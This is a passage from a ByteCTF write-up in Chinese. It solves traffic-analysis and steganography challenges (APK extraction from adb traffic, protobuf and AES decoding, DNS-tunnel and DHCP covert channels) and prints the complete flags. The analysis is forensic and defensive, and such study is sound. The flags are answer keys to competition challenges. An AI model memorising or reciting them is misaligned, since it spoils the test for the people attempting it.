data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620733206761/041be496ce7aac1da1a65a0762bc2210dd3e5fa1.png@200w.png"></p>
+<p>掃描二維碼可得如下內容。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U_kn0W_S57V&#125;</span><br></pre></td></tr></table></figure>
+
+<p>將得到的兩部分 flag 拼合即可得到完整的 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;m4yB3_U_kn0W_S57V&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="BabyShark"><a href="#BabyShark" class="headerlink" title="BabyShark"></a>BabyShark</h3><p>使用 WireShark 進行流量分析，在 TCP 流 0 處可以發現除錯橋的流量。從中可以提取出一個 apk 檔案。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620786377949/844179c9969a7684f894411b54401d4210bdbec0.png"></p>
+<p>提取出的安裝包可以使用 jadx-gui 進行反編譯，可以發現其 MainActivity 中包含如下程式碼。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.misc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Build;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.os.StrictMode;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.app.ActivityCompat;</span><br><span class="line"><span class="keyword">import</span> dalvik.system.DexClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> okhttp3.HttpUrl;</span><br><span class="line"><span class="keyword">import</span> okhttp3.OkHttpClient;</span><br><span class="line"><span class="keyword">import</span> okhttp3.Request;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            StrictMode.setThreadPolicy(<span class="keyword">new</span> StrictMode.ThreadPolicy.Builder().permitAll().build());</span><br><span class="line">        &#125;</span><br><span class="line">        AesUtil.decrypt(getAESKey(getPBResp(), loadPBClass(getPBClass()).getMethods()[<span class="number">37</span>]), <span class="string">&quot;8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Class <span class="title">loadPBClass</span><span class="params">(String jarFilePath)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> DexClassLoader(<span class="keyword">new</span> File(jarFilePath).getAbsolutePath(), getDir(<span class="string">&quot;dex&quot;</span>, <span class="number">0</span>).getAbsolutePath(), <span class="keyword">null</span>, getClassLoader()).loadClass(<span class="string">&quot;com.bytectf.misc1.KeyPB&quot;</span>).getClasses()[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPBClass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(<span class="keyword">this</span>, <span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> HttpUrl.FRAGMENT_ENCODE_SET;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ActivityCompat.checkSelfPermission(<span class="keyword">this</span>, <span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ActivityCompat.requestPermissions(<span class="keyword">this</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>&#125;, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> HttpUrl.FRAGMENT_ENCODE_SET;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Environment.getExternalStorageState().equals(<span class="string">&quot;mounted&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> Environment.getExternalStorageDirectory().getAbsolutePath() + <span class="string">&quot;/PBClass.dex&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> HttpUrl.FRAGMENT_ENCODE_SET;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getAESKey</span><span class="params">(<span class="keyword">byte</span>[] pb_bytes, Method parseFrom)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object respObj = parseFrom.invoke(<span class="keyword">null</span>, pb_bytes);</span><br><span class="line">            <span class="keyword">return</span> ((Long) respObj.getClass().getMethod(<span class="string">&quot;getKey&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]).invoke(respObj, <span class="keyword">new</span> Object[<span class="number">0</span>])).longValue();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] getPBResp() &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] pb_res = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> OkHttpClient().newCall(<span class="keyword">new</span> Request.Builder().url(<span class="string">&quot;http://192.168.2.247:5000/api&quot;</span>).build()).execute().body().bytes();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> pb_res;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中針對一個 dex 進行了動態載入，但是這裡並沒有給出這個 dex 檔案。在 onCreate 中使用到了這個 dex 檔案中的類進行反射來獲取金鑰。而 getPBResp 方法中與後端的 API 進行了互動，因此在流量包中找到對應的響應。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634621373482519/76b56b2710e243534ddb5249bd8f6f6965181626.png"></p>
+<p>可以發現響應的是一段二進位制資料，這裡需要腦洞一下，PBResp 實際上就是 ProtoBufResponse 的縮略寫法。將如下響應資料使用 ProtoBuf 解碼。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">08 8b b7 bd f5 db d5 37 11 a1 f8 31 e6 d6 1c c8 40</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">From_Hex(&#x27;Auto&#x27;)</span><br><span class="line">Protobuf_Decode(&#x27;&#x27;,true,true)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;field #1: VarInt (e.g. int32, bool)&quot;</span>: <span class="number">244837809871755</span>,</span><br><span class="line">    <span class="attr">&quot;field #2: 64-Bit (e.g. fixed64, double)&quot;</span>: <span class="number">4668012723080133000</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>將反編譯得到的 AesUtils 分離出來寫出如下程式碼呼叫來解密 AES。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytectf.misc1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String text = AesUtil.decrypt(<span class="number">244837809871755L</span>, <span class="string">&quot;8939AA47D35006FB2B5FBDB9A810B25294B5D4D76E4204D33BA01F7B3F9D99B1&quot;</span>);</span><br><span class="line">        System.out.println(text);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>執行上述程式碼即可得出 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;Tr4ff1c4nalys_i5@Us3fu1&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="frequently"><a href="#frequently" class="headerlink" title="frequently"></a>frequently</h3><blockquote>
+<p>Someone wants to send secret information through a surreptitious channel. Could you intercept their communications?</p>
+</blockquote>
+<h4 id="DNS-Protocol-Tunnel"><a href="#DNS-Protocol-Tunnel" class="headerlink" title="DNS Protocol Tunnel"></a>DNS Protocol Tunnel</h4><p>使用 WireShark 對流量包進行分析，可以發現大量的 xxxxxx.bytedanec.net 的 DNS 查詢請求，將其域名的第一段分離出來，使用 Base64 進行解碼可以得到如下圖片。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://api.lemonprefect.cn/image/hdslb/archive/b81e5c5e-81a0-4bdf-9234-a18738ddee9a/1634620842128581/c8c022c338e15391aedc7f4505739c08c3072e09.png"></p>
+<p>接著分析剩餘的 DNS 請求，可以發現其中的 i 和 o 遵循著某種規律。將其提取出來並使用如下 CyberChef Receipt 處理，可以得到如下資訊。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Find_/_Replace(&#123;&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;i\\n&#x27;&#125;,&#x27;1&#x27;,true,false,true,false)</span><br><span class="line">Find_/_Replace(&#123;&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;o\\n&#x27;&#125;,&#x27;0&#x27;,true,false,true,false)</span><br><span class="line">Find_/_Replace(&#123;&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27; &#x27;&#125;,&#x27;&#x27;,true,false,true,false)</span><br><span class="line">From_Binary(&#x27;Space&#x27;,8)</span><br><span class="line">The first part of flag: ByteCTF&#123;^_^enJ0y&amp;y0u9</span><br></pre></td></tr></table></figure>
+
+<h4 id="DHCP-Protocol-IP-Address-Lease-Time"><a href="#DHCP-Protocol-IP-Address-Lease-Time" class="headerlink" title="DHCP Protocol IP Address Lease Time"></a>DHCP Protocol IP Address Lease Time</h4><p>在流量包中可以發現 DHCP 包，將 ACK 中包含的 IP Address Lease Time 提取出來可以得到後一半 flag。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure>
+
+<p>將兩半 flag 拼合即可得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;^_^enJ0y&amp;y0u9se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Lost-Excel"><a href="#Lost-Excel" class="headerlink" title="Lost Excel"></a>Lost Excel</h3><blockquote>
+<p>Please find out who leaked this document asap</p>
+</blockquote>
+<p>在給出的表格檔案的 media 中可以得到一張圖片。使用 StegSolve 可以在 Red plane 0 下得到另一張圖。</p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZo